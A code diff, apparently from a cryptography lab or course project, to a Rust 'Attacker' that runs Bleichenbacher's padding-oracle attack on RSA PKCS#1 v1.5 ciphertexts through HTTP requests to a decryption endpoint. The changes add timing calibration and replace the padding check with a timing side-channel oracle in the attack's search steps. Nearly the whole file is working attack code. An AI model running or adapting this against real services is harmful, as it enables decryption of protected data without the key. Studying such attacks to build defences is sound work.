@@ -1,8 +1,12 @@
 #![allow(dead_code)]
 #![allow(non_snake_case)]
 
+use std::u128;
+
+use hex::ToHex;
 use num_bigint::BigUint;
 use num_traits::{Num, Zero};
+use rand::Rng;
 use reqwest::blocking::Client;
 use serde_json::Value;
 
@@ -14,6 +18,7 @@ pub struct Attacker {
     pub url: String,
     pub c_bytes: Vec<u8>,
     pub state: AttackState,
+    pub timing_threshold: u128,
 }
 
 impl Attacker {
@@ -43,13 +48,51 @@ impl Attacker {
 
         let state = AttackState::new(rsa_pubkey, &c);
 
+        let timing_threshold = 0u128;
 
         Ok(Self {
             client,
             url: String::from(url),
             c_bytes: c,
             state,
+            timing_threshold,
         })
+    }
+
+    pub fn calibrate_timing(&self, repeats: u32) -> Result<u128, CustomError> {
+        let trials = 5usize;
+        let mut valid_times = Vec::new();
+        for _ in 0..trials {
+            let res = self.decrypt(&self.c_bytes, Some(repeats))?;
+            valid_times.push(res.time_ns);
+        }
+        let valid_mean = valid_times.iter().copied().sum::<u128>() / (valid_times.len() as u128);
+
+        // measure several invalid ciphertexts (flip one byte or random)
+        let mut invalid_times = Vec::new();
+        for _ in 0..trials {
+            let mut rng = rand::rng();
+            let mut bad = self.c_bytes.clone();
+
+            let idx = rng.random_range(0..bad.len());
+            bad[idx] ^= 0xff;
+            let res = self.decrypt(&bad, Some(repeats))?;
+            invalid_times.push(res.time_ns);
+        }
+        let invalid_mean = invalid_times.iter().copied().sum::<u128>() / (invalid_times.len() as u128);
+
+        println!("calibrate: valid_mean={} ns, invalid_mean={} ns", valid_mean, invalid_mean);
+
+        // choose midpoint as threshold
+        let threshold = (valid_mean + invalid_mean) / 2u128;
+        Ok(threshold)
+    }
+
+    pub fn is_valid_by_timing(&self, cipher: &[u8], repeats: u32) -> Result<bool, CustomError> {
+        let res = self.decrypt(cipher, Some(repeats))?;
+        let t = res.time_ns;
+        let threshold = self.timing_threshold;
+        Ok(t < threshold)
     }
 
     pub fn encrypt(&self, plain: &[u8], repeat: Option<u32>) -> Result<EncryptRes, CustomError> {
@@ -67,6 +110,7 @@ impl Attacker {
     }
 
     pub fn decrypt(&self, cipher: &[u8], repeat: Option<u32>) -> Result<DecryptRes, CustomError> {
+        assert_eq!(cipher.len(), self.state.k);
         let cipher_hex = hex::encode(cipher);
         let mut full_url = String::new();
         full_url.push_str(&self.url);
@@ -82,13 +126,9 @@ impl Attacker {
 
     /// Step 1 can be skipped since `c` is already a valid PKCS#1 v1.5 ciphertext.
     pub fn bleichenbacher_attack(&mut self) -> Result<Vec<u8>, CustomError> {
-        println!(
-            "Starting attack: k = {}, n_bits = {}",
-            self.state.k,
-            self.state.n.bits()
-        );
-        println!("Ciphertext length = {}", self.c_bytes.len());
-
+        println!("Calibrating timing");
+        self.timing_threshold = self.calibrate_timing(1000)?;
+        println!("Timing threshold set to {} ns", self.timing_threshold);
 
         let mut si = self.step2a()?;
 
@@ -104,7 +144,7 @@ impl Attacker {
                     // only one interval left with a == b
                     return self.step4(&si).map(|m| {
                         let mut m_bytes = m.to_bytes_be();
-                        // prepend leading zeros if necessary
+
                         while m_bytes.len() < self.state.k {
                             m_bytes.insert(0, 0u8);
                         }
@@ -113,6 +153,10 @@ impl Attacker {
                 } else {
                     si = self.step2c(&si)?;
                 }
+            } else {
+                return Err(CustomError::Other(
+                    "No intervals left in M".to_string(),
+                ));
             }
 
             println!("Found si = {}", si);
@@ -128,8 +172,8 @@ impl Attacker {
             let c_prime = (&self.state.c * s.modpow(&self.state.e, &self.state.n)) % &self.state.n;
             let c_prime_bytes = to_k_bytes_be(&c_prime, self.state.k);
 
-            println!("step2a: trying s = {}", s);
-            if self.decrypt(&c_prime_bytes, None)?.is_valid_pkcs1() {
+            println!("Trying c_prime: {}", hex::encode(&c_prime_bytes));
+            if self.is_valid_by_timing(&c_prime_bytes, 1000)? {
                 return Ok(s);
             }
             s += 1u8;
@@ -141,7 +185,7 @@ impl Attacker {
         loop {
             let c_prime = (&self.state.c * si.modpow(&self.state.e, &self.state.n)) % &self.state.n;
             let c_prime_bytes = to_k_bytes_be(&c_prime, self.state.k);
-            if self.decrypt(&c_prime_bytes, None)?.is_valid_pkcs1() {
+            if self.is_valid_by_timing(&c_prime_bytes, 1000)? {
                 return Ok(si);
             }
             si += 1u8;
@@ -160,7 +204,7 @@ impl Attacker {
                     (&self.state.c * si.modpow(&self.state.e, &self.state.n)) % &self.state.n;
                 let c_prime_bytes = to_k_bytes_be(&c_prime, self.state.k);
 
-                if self.decrypt(&c_prime_bytes, None)?.is_valid_pkcs1() {
+                if self.is_valid_by_timing(&c_prime_bytes, 1000)? {
                     return Ok(si);
                 }
                 si += 1u8;
